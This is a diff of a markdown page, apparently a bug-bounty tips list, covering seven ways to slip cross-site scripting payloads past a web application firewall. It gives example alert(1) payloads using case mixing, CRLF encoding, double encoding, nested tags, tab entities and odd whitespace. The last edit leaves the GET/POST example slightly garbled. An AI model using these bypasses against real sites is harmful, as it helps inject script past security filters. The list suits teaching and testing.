@@ -267,16 +267,21 @@ Here’s list of tools [@_justYnot](https://twitter.com/_justYnot) used:
 Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application Firewall) while exploiting XSS (Cross-Site Scripting) in a web application:
 1. Check if the firewall is blocking only lowercase:
 <sCRipT>alert(1)</sCRiPt>
+
 2. Try to break firewall regex with new line (\r\n), aka. CRLF injection:
 <script>%0d%0aalert(1)</script>
+
 3. Try double encoding:
 %2522
+
 4. Testing for recursive filters, if firewall removes the text in bold, we will have clear payload:
 <scr<script>ipt>alert(1);</scr</script>ipt>
+
 5. Injecting anchor tag without whitespaces:
 <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+
 6. Try to bypass whitespaces using a bullet:
 <svg•onload=alert(1)>
+
 7. Try to change request method (POST instead of GET):
-GET /?q=xss	POST /
-q=xss	
+GET /?q=xss	    POST /q=xss	
